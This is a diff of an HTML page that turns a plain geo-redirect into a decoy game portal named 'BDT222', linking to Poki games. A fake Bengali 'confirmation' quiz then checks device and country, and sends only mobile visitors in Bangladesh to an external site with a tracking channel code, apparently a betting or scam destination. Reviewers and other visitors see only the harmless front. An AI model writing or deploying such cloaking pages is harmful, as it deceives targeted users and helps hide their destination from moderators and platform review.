@@ -1,98 +1,273 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
   <meta charset="UTF-8">
-  <title>Redirect...</title>
+  <title>BDT222</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <style>
-    /* Ẩn mọi thứ, tránh chớp nội dung */
+    * { box-sizing: border-box; }
+
     html, body {
       margin: 0;
       padding: 0;
       width: 100%;
-      height: 100%;
+      min-height: 100%;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont,
+        "Segoe UI", Roboto, "Noto Sans Bengali", sans-serif;
+      background: radial-gradient(circle at top, #0f172a 0, #020617 50%, #000 100%);
+      color: #e5e7eb;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .page {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px 16px 40px;
+      flex: 1;
+    }
+
+    /* Logo */
+    .logo {
+      font-size: 30px;
+      font-weight: 800;
+      text-align: center;
+      margin-bottom: 18px;
+      letter-spacing: 4px;
+      color: #facc15;
+      text-shadow: 0 0 10px rgba(250, 204, 21, 0.6);
+    }
+
+    /* GAMES GRID */
+    .games-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 14px;
+    }
+
+    .game-card {
+      background: rgba(15, 23, 42, 0.96);
+      border-radius: 16px;
+      padding: 8px 8px 10px;
+      display: flex;
+      flex-direction: column;
+      text-decoration: none;
+      color: inherit;
+      border: 1px solid rgba(148, 163, 184, 0.4);
+      box-shadow: 0 12px 30px rgba(0,0,0,0.7);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .game-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 18px 40px rgba(0,0,0,0.9);
+      border-color: rgba(129, 140, 248, 0.8);
+    }
+
+    .thumb-wrap {
+      border-radius: 12px;
       overflow: hidden;
-      background: #000; /* đổi #fff nếu thích nền trắng */
+      margin-bottom: 8px;
+      background: #020617;
+    }
+
+    .thumb-wrap img {
+      width: 100%;
+      height: 110px;
+      object-fit: cover;
+    }
+
+    .game-title {
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+
+    .game-meta {
+      font-size: 11px;
+      color: #9ca3af;
+    }
+
+    /* MODAL */
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 23, 42, 0.86);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 50;
+    }
+
+    .modal {
+      width: 95%;
+      max-width: 360px;
+      background: rgba(15, 23, 42, 0.98);
+      border-radius: 20px;
+      padding: 20px 18px 16px;
+      border: 1px solid rgba(148, 163, 184, 0.6);
+      text-align: center;
+    }
+
+    .modal-title {
+      font-size: 18px;
+      margin: 0 0 6px;
+    }
+
+    .modal-sub {
+      font-size: 14px;
+      margin: 0 0 14px;
+      color: #cbd5f5;
+    }
+
+    .modal-form {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 8px;
+    }
+
+    .modal-input {
+      flex: 1;
+      border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.7);
+      padding: 8px 10px;
+      background: rgba(15, 23, 42, 0.9);
+      color: #e5e7eb;
+    }
+
+    .modal-btn {
+      border: none;
+      border-radius: 999px;
+      padding: 8px 14px;
+      font-size: 14px;
+      font-weight: 600;
+      background: linear-gradient(135deg, #22c55e, #16a34a);
+      color: #022c22;
+      cursor: pointer;
+    }
+
+    .modal-status {
+      font-size: 12px;
+      color: #9ca3af;
+      min-height: 18px;
     }
   </style>
 </head>
+
 <body>
+
+  <div class="page">
+    <div class="logo">BDT222</div>
+
+    <div class="games-grid">
+
+      <a class="game-card" href="https://poki.com/en/g/subway-surfers" target="_blank">
+        <div class="thumb-wrap">
+          <img src="https://a.poki-cdn.com/icons/favicon-194x194.png">
+        </div>
+        <div class="game-title">Subway Surfers</div>
+        <div class="game-meta">Poki-তে খেলুন</div>
+      </a>
+
+      <a class="game-card" href="https://poki.com/en/g/temple-run-2" target="_blank">
+        <div class="thumb-wrap">
+          <img src="https://a.poki-cdn.com/icons/favicon-194x194.png">
+        </div>
+        <div class="game-title">Temple Run 2</div>
+        <div class="game-meta">Poki-তে খেলুন</div>
+      </a>
+
+      <a class="game-card" href="https://poki.com/en/g/drive-mad" target="_blank">
+        <div class="thumb-wrap">
+          <img src="https://a.poki-cdn.com/icons/favicon-194x194.png">
+        </div>
+        <div class="game-title">Drive Mad</div>
+        <div class="game-meta">Poki-তে খেলুন</div>
+      </a>
+
+      <a class="game-card" href="https://poki.com/en/g/football-legends" target="_blank">
+        <div class="thumb-wrap">
+          <img src="https://a.poki-cdn.com/icons/favicon-194x194.png">
+        </div>
+        <div class="game-title">Football Legends</div>
+        <div class="game-meta">Poki-তে খেলুন</div>
+      </a>
+
+    </div>
+  </div>
+
+  <!-- POPUP -->
+  <div class="modal-backdrop" id="quiz-modal">
+    <div class="modal">
+      <h2 class="modal-title">নিশ্চিতকরণ</h2>
+      <p class="modal-sub">দয়া করে উত্তর দিন:<br><strong>১ + ১ = ?</strong></p>
+
+      <form class="modal-form" id="quiz-form">
+        <input type="text" class="modal-input" id="answer-input" placeholder="আপনার উত্তর লিখুন…" />
+        <button type="submit" class="modal-btn" id="answer-btn">পাঠান</button>
+      </form>
+
+      <div class="modal-status" id="quiz-status"></div>
+    </div>
+  </div>
+
   <script>
-  (function () {
-    // 🔗 LINK ĐÃ GẮN SẴN
-    const BD_URL    = "https://vifca.vip/zhvhg"; // Trang A: chỉ cho BD + mobile
-    const OTHER_URL = "https://poki.com";                      // Trang B: mọi trường hợp còn lại
+    // 👉 Link A — chỉ dành cho mobile + Bangladesh
+    const TARGET_URL = "https://www.khcyz.vip/?ch=4f80366d81";
 
-    // ⏱ Thời gian delay (ms)
-    const DELAY = 1000; // 1 giây (có thể đổi 1500 / 2000)
-
-    const CACHE_KEY = "geo_device_redirect_v1"; // key lưu trong sessionStorage
-
-    // Hàm check mobile / tablet
     function isMobileOrTablet() {
-      var ua = navigator.userAgent || navigator.vendor || window.opera;
-      var mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i;
-      return mobileRegex.test(ua);
+      let ua = navigator.userAgent || navigator.vendor || window.opera;
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
     }
 
-    function safeGetCache() {
-      try {
-        return sessionStorage.getItem(CACHE_KEY);
-      } catch (e) {
-        return null;
+    function showQuizModal() {
+      document.getElementById("quiz-modal").style.display = "flex";
+      document.getElementById("answer-input").focus();
+    }
+
+    // After 3 seconds → show popup
+    setTimeout(showQuizModal, 3000);
+
+    document.getElementById("quiz-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      handleSubmit();
+    });
+
+    function handleSubmit() {
+      const statusEl = document.getElementById("quiz-status");
+      const btn = document.getElementById("answer-btn");
+      btn.disabled = true;
+      statusEl.textContent = "প্রক্রিয়া চলছে...";
+
+      if (!isMobileOrTablet()) {
+        statusEl.textContent = "এই ডিভাইসটি সমর্থিত নয়।";
+        btn.disabled = false;
+        return;
       }
+
+      fetch("https://ipapi.co/country/")
+        .then(r => r.text())
+        .then(code => {
+          code = (code || "").trim().toUpperCase();
+
+          if (code === "BD") {
+            window.location.href = TARGET_URL;
+          } else {
+            statusEl.textContent = "আপনার অবস্থান সমর্থিত নয়।";
+            btn.disabled = false;
+          }
+        })
+        .catch(() => {
+          statusEl.textContent = "ত্রুটি হয়েছে। পরে চেষ্টা করুন।";
+          btn.disabled = false;
+        });
     }
-
-    function safeSetCache(value) {
-      try {
-        sessionStorage.setItem(CACHE_KEY, value);
-      } catch (e) {
-        // ignore
-      }
-    }
-
-    // targetFlag: "A" (BD + mobile) hoặc "B" (các trường hợp khác)
-    function go(targetFlag) {
-      var url = (targetFlag === "A") ? BD_URL : OTHER_URL;
-
-      // Dùng replace để tránh user bấm Back quay lại trang check
-      setTimeout(function () {
-        window.location.replace(url);
-      }, DELAY);
-    }
-
-    // 1️⃣ Nếu đã có cache → không gọi API nữa, redirect nhanh hơn
-    var cached = safeGetCache();
-    if (cached === "A" || cached === "B") {
-      go(cached);
-      return;
-    }
-
-    // 2️⃣ Chưa có cache → gọi API xác định quốc gia
-    fetch("https://ipapi.co/country/")
-      .then(function (res) {
-        return res.text();
-      })
-      .then(function (code) {
-        code = (code || "").toString().trim().toUpperCase();
-
-        var flag;
-        // ✅ CHỈ KHI BD + MOBILE/TABLET MỚI VÀO TRANG A
-        if (code === "BD" && isMobileOrTablet()) {
-          flag = "A";   // BD + mobile → Web A
-        } else {
-          flag = "B";   // còn lại → Web B
-        }
-
-        safeSetCache(flag);
-        go(flag);
-      })
-      .catch(function () {
-        // Nếu lỗi API → mặc định cho sang B
-        safeSetCache("B");
-        go("B");
-      });
-  })();
   </script>
+
 </body>
 </html>
